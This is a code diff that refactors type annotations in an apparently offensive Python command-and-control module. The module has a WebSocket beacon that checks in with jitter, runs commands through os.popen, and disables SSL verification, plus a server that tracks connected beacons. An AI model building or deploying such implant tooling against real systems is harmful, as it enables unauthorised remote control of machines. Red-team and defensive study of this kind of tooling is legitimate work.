@@ -11,9 +11,9 @@ import ssl
 import threading
 import time
 import uuid
-from base64 import b64encode, b64decode
-from typing import Any, Callable, Dict, List, Optional
-
+from base64 import b64decode, b64encode
+from collections.abc import Callable
+from typing import Any
 
 try:
     import websocket
@@ -59,12 +59,12 @@ class WebSocketBeacon:
     def __init__(
         self,
         server_url: str,
-        beacon_id: Optional[str] = None,
-        encryption_key: Optional[bytes] = None,
+        beacon_id: str | None = None,
+        encryption_key: bytes | None = None,
         sleep_seconds: int = 10,
         jitter_percent: float = 0.2,
         ssl_verify: bool = False,
-        proxy: Optional[str] = None,
+        proxy: str | None = None,
     ):
         if not HAS_WEBSOCKET_CLIENT:
             raise ImportError("websocket-client is required. Install with: pip install websocket-client")
@@ -76,9 +76,9 @@ class WebSocketBeacon:
         self.ssl_verify = ssl_verify
         self.proxy = proxy
         self._running = False
-        self._tasks: List[Dict] = []
-        self._results: List[Dict] = []
-        self._ws: Optional[websocket.WebSocket] = None
+        self._tasks: list[dict] = []
+        self._results: list[dict] = []
+        self._ws: websocket.WebSocket | None = None
 
         if encryption_key and HAS_FERNET:
             self._fernet = Fernet(encryption_key)
@@ -122,7 +122,7 @@ class WebSocketBeacon:
             bool: True if connected successfully.
         """
         try:
-            ws_kwargs: Dict[str, Any] = {
+            ws_kwargs: dict[str, Any] = {
                 'enable_multithread': True,
             }
 
@@ -145,7 +145,7 @@ class WebSocketBeacon:
         except Exception:
             return False
 
-    def check_in(self) -> Optional[Dict]:
+    def check_in(self) -> dict | None:
         """Send heartbeat and retrieve pending tasks.
 
         Returns:
@@ -192,14 +192,13 @@ class WebSocketBeacon:
             except Exception:
                 pass
 
-    def run(self, command_handler: Optional[Callable[[str], tuple]] = None) -> None:
+    def run(self, command_handler: Callable[[str], tuple] | None = None) -> None:
         """Main beacon loop with check-in and command execution.
 
         Args:
             command_handler: Callable that takes a command string and returns
                              (output, exit_code). Uses os.popen if None.
         """
-        import random
 
         self._running = True
 
@@ -267,10 +266,10 @@ class WebSocketC2Handler:
         self,
         host: str = WS_HOST,
         port: int = WS_PORT,
-        ssl_context: Optional[ssl.SSLContext] = None,
-        beacon_callback: Optional[Callable] = None,
-        task_callback: Optional[Callable] = None,
-        result_callback: Optional[Callable] = None,
+        ssl_context: ssl.SSLContext | None = None,
+        beacon_callback: Callable | None = None,
+        task_callback: Callable | None = None,
+        result_callback: Callable | None = None,
     ):
         if not HAS_WEBSOCKET_SERVER:
             raise ImportError("websockets is required. Install with: pip install websockets")
@@ -281,8 +280,8 @@ class WebSocketC2Handler:
         self.beacon_callback = beacon_callback
         self.task_callback = task_callback
         self.result_callback = result_callback
-        self.beacons: Dict[str, Any] = {}
-        self._server: Optional[Any] = None
+        self.beacons: dict[str, Any] = {}
+        self._server: Any | None = None
         self._running = False
 
     async def _handle_connection(self, websocket, path: str) -> None:
@@ -412,7 +411,7 @@ class WebSocketC2Handler:
         except Exception:
             return False
 
-    def list_beacons(self) -> List[Dict]:
+    def list_beacons(self) -> list[dict]:
         """List all connected beacons.
 
         Returns:
@@ -429,7 +428,7 @@ class WebSocketC2Handler:
             for bid, info in self.beacons.items()
         ]
 
-    def remove_stale_beacons(self, timeout: int = 300) -> List[str]:
+    def remove_stale_beacons(self, timeout: int = 300) -> list[str]:
         """Remove beacons that have not checked in within the timeout.
 
         Args:
